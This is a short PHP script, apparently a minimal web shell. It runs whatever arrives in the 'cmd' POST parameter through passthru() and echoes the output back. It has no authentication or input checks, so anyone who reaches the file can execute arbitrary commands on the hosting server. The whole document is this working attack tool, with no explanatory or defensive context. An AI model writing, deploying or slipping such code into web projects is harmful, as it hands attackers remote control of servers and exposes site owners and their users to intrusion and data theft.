<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('passthru'))
		{
			echo passthru($com);
		}
	}
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
echo $buffer;
?>